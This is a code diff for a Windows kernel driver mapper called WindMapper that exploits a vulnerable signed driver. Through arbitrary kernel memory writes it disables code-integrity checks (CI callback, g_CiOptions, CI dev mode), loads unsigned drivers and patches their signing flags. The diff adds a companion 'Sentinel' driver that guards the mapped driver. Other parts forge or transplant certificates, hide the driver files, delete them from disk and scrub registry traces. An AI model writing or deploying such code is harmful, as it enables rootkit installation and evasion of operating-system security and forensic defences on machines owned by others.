@@ -316,7 +316,7 @@ namespace Utils {
 
 namespace MapperCore {
 
-    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName) {
+    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName) {
         HANDLE deviceHandle = nullptr;
         NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);
 
@@ -368,6 +368,13 @@ namespace MapperCore {
                         status = DriverLoader::LoadDriver(g_DriverServicePath);
                         printf("[*] Target driver load result: 0x%08X\n", status);
 
+                        // Load Sentinel within the same CI bypass window
+                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
+                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
+                            printf("[*] Loading Sentinel driver...\n");
+                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
+                            printf("[*] Sentinel load result: 0x%08X\n", sentStatus);
+                        }
 
                         VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                         g_CiCallbackPatched = false;
@@ -377,6 +384,11 @@ namespace MapperCore {
                             printf("[*] Patching driver signing flags...\n");
                             if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName))
                                 printf("[-] Signing flags patch failed\n");
+                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
+                                printf("[*] Patching Sentinel signing flags...\n");
+                                if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName))
+                                    printf("[-] Sentinel signing flags patch failed\n");
+                            }
                             goto done;
                         }
                         printf("[!] Tier 1 load failed, trying Tier 2...\n");
@@ -407,6 +419,13 @@ namespace MapperCore {
                         status = DriverLoader::LoadDriver(g_DriverServicePath);
                         printf("[*] Target driver load result: 0x%08X\n", status);
 
+                        // Load Sentinel within the same CI bypass window
+                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
+                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
+                            printf("[*] Loading Sentinel driver...\n");
+                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
+                            printf("[*] Sentinel load result: 0x%08X\n", sentStatus);
+                        }
 
                         VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &g_OriginalCiOptions, sizeof(DWORD));
                         g_CiOptionsPatched = false;
@@ -416,6 +435,11 @@ namespace MapperCore {
                             printf("[*] Patching driver signing flags...\n");
                             if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName))
                                 printf("[-] Signing flags patch failed\n");
+                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
+                                printf("[*] Patching Sentinel signing flags...\n");
+                                if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName))
+                                    printf("[-] Sentinel signing flags patch failed\n");
+                            }
                             goto done;
                         }
                         printf("[!] Tier 2 load failed, trying Tier 3...\n");
@@ -447,6 +471,13 @@ namespace MapperCore {
                         status = DriverLoader::LoadDriver(g_DriverServicePath);
                         printf("[*] Target driver load result: 0x%08X\n", status);
 
+                        // Load Sentinel within the same CI bypass window
+                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
+                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
+                            printf("[*] Loading Sentinel driver...\n");
+                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
+                            printf("[*] Sentinel load result: 0x%08X\n", sentStatus);
+                        }
 
                         VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &g_OriginalCiDevMode, sizeof(DWORD));
                         g_CiDevModePatched = false;
@@ -456,6 +487,11 @@ namespace MapperCore {
                             printf("[*] Patching driver signing flags...\n");
                             if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName))
                                 printf("[-] Signing flags patch failed\n");
+                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
+                                printf("[*] Patching Sentinel signing flags...\n");
+                                if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName))
+                                    printf("[-] Sentinel signing flags patch failed\n");
+                            }
                             goto done;
                         }
                     }
@@ -466,6 +502,39 @@ namespace MapperCore {
         }
 
 done:
+        // Write WhosWho's base address into Sentinel's .sntl section while the
+        // vuln driver device handle is still open. Sentinel's init thread polls
+        // this value and begins protection once it's non-zero.
+        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
+            // Find Sentinel's kernel base by enumerating loaded modules
+            ULONG sentImageSize = 0;
+            PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
+            if (sentBase) {
+                g_SentinelLoadAddress = sentBase;
+                g_SentinelImageSize = sentImageSize;
+                printf("[+] Sentinel base: %p, size: 0x%X\n", sentBase, sentImageSize);
+
+                // Find WhosWho's base the same way
+                ULONG whoswhoImageSize = 0;
+                PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
+                if (whoswhoBase) {
+                    g_DriverLoadAddress = whoswhoBase;
+                    printf("[+] WhosWho base: %p, size: 0x%X\n", whoswhoBase, whoswhoImageSize);
+
+                    if (WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
+                                             whoswhoBase, whoswhoImageSize)) {
+                        printf("[+] WhosWho base written to Sentinel .sntl section\n");
+                    } else {
+                        printf("[-] Failed to write globals to Sentinel\n");
+                    }
+                } else {
+                    printf("[-] Could not find WhosWho in loaded modules\n");
+                }
+            } else {
+                printf("[-] Could not find Sentinel in loaded modules\n");
+            }
+        }
+
         // Ensure the device handle is closed BEFORE attempting to unload the driver.
         // If the handle is open, NtUnloadDriver marks it for unload but doesn't actually unload it,
         // causing the file to remain locked in the Temp directory indefinitely.
@@ -475,7 +544,7 @@ done:
         return status;
     }
 
-    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath) {
+    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath) {
         printf("[*] Adjusting privileges...\n");
         NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
         if (!NT_SUCCESS(status)) {
@@ -506,6 +575,23 @@ done:
             printf("[-] Failed to create loader service: 0x%08X\n", status);
             return status;
         }
+
+        // Create Sentinel service if a sentinel path was provided
+        WCHAR sentinelFullPath[520] = {};
+        if (sentinelPath && sentinelPath[0]) {
+            status = Utils::GetFullPath(sentinelPath, sentinelFullPath, sizeof(sentinelFullPath));
+            if (!NT_SUCCESS(status)) {
+                printf("[-] Failed to resolve Sentinel full path: 0x%08X\n", status);
+                return status;
+            }
+            status = DriverLoader::CreateDriverService(g_SentinelServicePath, sentinelFullPath);
+            if (!NT_SUCCESS(status)) {
+                printf("[-] Failed to create Sentinel service: 0x%08X\n", status);
+                return status;
+            }
+            printf("[+] Sentinel service created\n");
+        }
+
         printf("[+] Services created\n");
 
 
@@ -617,9 +703,18 @@ done:
         if (targetFileName) targetFileName++;
         else targetFileName = driverFullPath;
 
+        // Resolve Sentinel filename for TriggerExploit (needed for signing flags patch)
+        PCWSTR sentinelFileName = nullptr;
+        if (sentinelFullPath[0]) {
+            sentinelFileName = wcsrchr(sentinelFullPath, L'\\');
+            if (sentinelFileName) sentinelFileName++;
+            else sentinelFileName = sentinelFullPath;
+            printf("[*] Sentinel driver filename resolved: %ws\n", sentinelFileName);
+        }
+
         printf("[*] Target driver filename resolved: %ws\n", targetFileName);
 
-        status = TriggerExploit(targetFileName);
+        status = TriggerExploit(targetFileName, sentinelFileName);
         printf("[*] Exploit result: 0x%08X\n", status);
 
         // Always attempt to delete the unsigned target driver file after a
@@ -632,6 +727,14 @@ done:
                 printf("[+] Target driver file deleted/renamed from disk\n");
             } else {
                 printf("[-] Failed to fully delete target driver, marked for deletion on reboot\n");
+            }
+            // Also delete Sentinel's on-disk image
+            if (sentinelFullPath[0]) {
+                if (Utils::ForceDeleteOrRename(sentinelFullPath)) {
+                    printf("[+] Sentinel driver file deleted/renamed from disk\n");
+                } else {
+                    printf("[-] Failed to fully delete Sentinel driver, marked for deletion on reboot\n");
+                }
             }
         }
 
@@ -657,6 +760,118 @@ done:
         }
 
         return status;
+    }
+
+    BOOL WriteSentinelGlobals(HANDLE device, PVOID sentinelBase, ULONG sentinelImageSize,
+                              PVOID whoswhoBase, ULONG whoswhoSize) {
+        // Parse Sentinel's PE header from kernel memory to find the .sntl section.
+        // The .sntl section contains exported globals:
+        //   g_target_driver_base  (offset +0x00, PVOID)
+        //   g_target_driver_object (offset +0x08, PVOID) — not written by mapper
+        //   g_target_driver_size  (offset +0x10, ULONG)
+        //
+        // We read the PE header, walk the section table, find ".sntl",
+        // then write WhosWho's base address into the first PVOID slot.
+        // Sentinel's init thread polls g_target_driver_base until it's non-zero,
+        // then begins protection.
+
+        // Read DOS header to get e_lfanew
+        IMAGE_DOS_HEADER dosHeader = {};
+        NTSTATUS status = VulnDriver::ReadKernelMemory(device, sentinelBase, &dosHeader, sizeof(dosHeader));
+        if (!NT_SUCCESS(status) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+            printf("[-] WriteSentinelGlobals: Failed to read Sentinel DOS header\n");
+            return FALSE;
+        }
+
+        // Read NT headers
+        PVOID ntHeaderAddr = reinterpret_cast<PVOID>(
+            reinterpret_cast<ULONG_PTR>(sentinelBase) + dosHeader.e_lfanew);
+
+        IMAGE_NT_HEADERS64 ntHeaders = {};
+        status = VulnDriver::ReadKernelMemory(device, ntHeaderAddr, &ntHeaders, sizeof(ntHeaders));
+        if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
+            printf("[-] WriteSentinelGlobals: Failed to read Sentinel NT headers\n");
+            return FALSE;
+        }
+
+        // Section table starts right after the optional header
+        ULONG_PTR sectionTableAddr =
+            reinterpret_cast<ULONG_PTR>(ntHeaderAddr) +
+            offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
+            ntHeaders.FileHeader.SizeOfOptionalHeader;
+
+        WORD numSections = ntHeaders.FileHeader.NumberOfSections;
+        if (numSections > 64) numSections = 64; // Sanity limit
+
+        // Read all section headers at once
+        IMAGE_SECTION_HEADER sections[64] = {};
+        status = VulnDriver::ReadKernelMemory(
+            device,
+            reinterpret_cast<PVOID>(sectionTableAddr),
+            sections,
+            numSections * sizeof(IMAGE_SECTION_HEADER));
+
+        if (!NT_SUCCESS(status)) {
+            printf("[-] WriteSentinelGlobals: Failed to read section table\n");
+            return FALSE;
+        }
+
+        // Find the .sntl section
+        PVOID sntlKernelAddr = nullptr;
+        ULONG sntlSize = 0;
+        for (WORD i = 0; i < numSections; i++) {
+            if (memcmp(sections[i].Name, ".sntl\0\0\0", 8) == 0) {
+                sntlKernelAddr = reinterpret_cast<PVOID>(
+                    reinterpret_cast<ULONG_PTR>(sentinelBase) + sections[i].VirtualAddress);
+                sntlSize = sections[i].Misc.VirtualSize;
+                printf("[+] Found .sntl section at RVA 0x%X, VA %p, size 0x%X\n",
+                       sections[i].VirtualAddress, sntlKernelAddr, sntlSize);
+                break;
+            }
+        }
+
+        if (!sntlKernelAddr) {
+            printf("[-] WriteSentinelGlobals: .sntl section not found in Sentinel PE\n");
+            return FALSE;
+        }
+
+        // .sntl section layout (defined in Sentinel's DriverEntry.cpp):
+        //   +0x00: volatile PVOID  g_target_driver_base   (8 bytes)
+        //   +0x08: volatile PVOID  g_target_driver_object (8 bytes)
+        //   +0x10: volatile ULONG  g_target_driver_size   (4 bytes)
+        // We need at least 0x14 bytes
+        if (sntlSize < 0x14) {
+            printf("[-] WriteSentinelGlobals: .sntl section too small (%u bytes)\n", sntlSize);
+            return FALSE;
+        }
+
+        // Write g_target_driver_base (WhosWho's kernel base)
+        PVOID baseSlotAddr = sntlKernelAddr;
+        status = VulnDriver::WriteKernelMemory(device, baseSlotAddr, &whoswhoBase, sizeof(PVOID));
+        if (!NT_SUCCESS(status)) {
+            printf("[-] WriteSentinelGlobals: Failed to write g_target_driver_base: 0x%08X\n", status);
+            return FALSE;
+        }
+
+        // If caller provided WhosWho's size, write it too.
+        // If not provided (0), the caller should have queried it already.
+        // We skip the fallback query here because the driver's on-disk filename
+        // is randomized and we don't know it at this point.
+
+        if (whoswhoSize > 0) {
+            PVOID sizeSlotAddr = reinterpret_cast<PVOID>(
+                reinterpret_cast<ULONG_PTR>(sntlKernelAddr) + 0x10);
+            status = VulnDriver::WriteKernelMemory(device, sizeSlotAddr, &whoswhoSize, sizeof(ULONG));
+            if (!NT_SUCCESS(status)) {
+                printf("[-] WriteSentinelGlobals: Failed to write g_target_driver_size: 0x%08X\n", status);
+                // Non-fatal — Sentinel can still work with just the base address
+            } else {
+                printf("[+] Wrote g_target_driver_size = 0x%X\n", whoswhoSize);
+            }
+        }
+
+        printf("[+] WriteSentinelGlobals: WhosWho base %p written to Sentinel .sntl section\n", whoswhoBase);
+        return TRUE;
     }
 
     NTSTATUS RestoreCiCallback(HANDLE device) {
@@ -752,6 +967,11 @@ done:
 
         if (wcslen(g_DriverServicePath) > 0 && g_DonorCopyPath[0] == L'\0') {
             deleteRegistryTree(g_DriverServicePath);
+        }
+
+        // Clean up Sentinel's service registry entry
+        if (wcslen(g_SentinelServicePath) > 0) {
+            deleteRegistryTree(g_SentinelServicePath);
         }
 
         return STATUS_SUCCESS;
@@ -977,7 +1197,7 @@ int main(int argc, char* argv[]) {
     }
 
     if (argc < 2) {
-        printf("[-] Usage: WindMapper.exe <driver.sys>\n");
+        printf("[-] Usage: WindMapper.exe <driver.sys> [sentinel.sys]\n");
         return 1;
     }
 
@@ -1004,6 +1224,18 @@ int main(int argc, char* argv[]) {
         driverArg.resize(static_cast<size_t>(wideLen));
         MultiByteToWideChar(CP_ACP, 0, argv[1], -1, &driverArg[0], wideLen);
         driverArg.resize(wcslen(driverArg.c_str()));
+    }
+
+    // Optional second argument: sentinel driver path
+    std::wstring sentinelArg;
+    if (argc >= 3) {
+        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[2], -1, nullptr, 0);
+        if (wideLen > 0) {
+            sentinelArg.resize(static_cast<size_t>(wideLen));
+            MultiByteToWideChar(CP_ACP, 0, argv[2], -1, &sentinelArg[0], wideLen);
+            sentinelArg.resize(wcslen(sentinelArg.c_str()));
+            printf("[+] Sentinel driver: %ws\n", sentinelArg.c_str());
+        }
     }
 
     if (g_P2CDriverSize == 0) {
@@ -1059,6 +1291,33 @@ int main(int argc, char* argv[]) {
         Utils::ForceDeleteOrRename(loaderFilePath.c_str());
         return 1;
     }
+
+    // Prepare Sentinel driver temp file (if provided)
+    std::wstring sentinelFilePath;
+    if (!sentinelArg.empty()) {
+        sentinelFilePath = Utils::GetTempFilePath(L".sys");
+        if (sentinelFilePath.empty()) {
+            printf("[-] Failed to generate Sentinel temp file path\n");
+            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
+            Utils::ForceDeleteOrRename(driverFilePath.c_str());
+            return 1;
+        }
+        if (!CopyFileW(sentinelArg.c_str(), sentinelFilePath.c_str(), FALSE)) {
+            printf("[-] Failed to copy Sentinel driver (err=%lu). Does the file exist?\n", GetLastError());
+            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
+            Utils::ForceDeleteOrRename(driverFilePath.c_str());
+            return 1;
+        }
+        // Apply cosmetic signature to Sentinel as well
+        printf("[*] Applying cosmetic signature to Sentinel driver...\n");
+        if (!SignedMemory::SelfSignDriver(sentinelFilePath.c_str())) {
+            SignedMemory::TransplantCertificateToDriver(sentinelFilePath.c_str());
+        }
+        SetFileAttributesW(sentinelFilePath.c_str(),
+                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
+        printf("[+] Sentinel file prepared\n");
+    }
+
     printf("[+] Files prepared\n");
 
     // Applying a cosmetic signature to the target driver to fix the missing "Digital Signatures" tab
@@ -1071,7 +1330,10 @@ int main(int argc, char* argv[]) {
     SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
 
     printf("[*] Starting driver mapping...\n");
-    NTSTATUS status = MapperCore::WindLoadDriver(loaderFilePath.c_str(), driverFilePath.c_str());
+    NTSTATUS status = MapperCore::WindLoadDriver(
+        loaderFilePath.c_str(),
+        driverFilePath.c_str(),
+        sentinelFilePath.empty() ? nullptr : sentinelFilePath.c_str());
 
     if (NT_SUCCESS(status)) {
         RunSignatureCheck(driverFilePath.c_str());
@@ -1082,11 +1344,18 @@ int main(int argc, char* argv[]) {
     // Use robust renaming/deletion strategy for guaranteed visual cleanup
     Utils::ForceDeleteOrRename(loaderFilePath.c_str());
     Utils::ForceDeleteOrRename(driverFilePath.c_str());
+    if (!sentinelFilePath.empty())
+        Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
 
     MapperCore::CleanupArtifacts();
 
     if (NT_SUCCESS(status)) {
         printf("[+] Driver mapped successfully\n");
+        if (g_SentinelLoadAddress) {
+            printf("[+] Sentinel driver loaded at %p (size 0x%X)\n",
+                   g_SentinelLoadAddress, g_SentinelImageSize);
+            printf("[+] Sentinel is now protecting WhosWho\n");
+        }
         if (g_DonorCopyPath[0]) {
             printf("[+] Donor file preserved at: %ws\n", g_DonorCopyPath);
             printf("[+] Service registry points to signed donor (driver stomping active)\n");
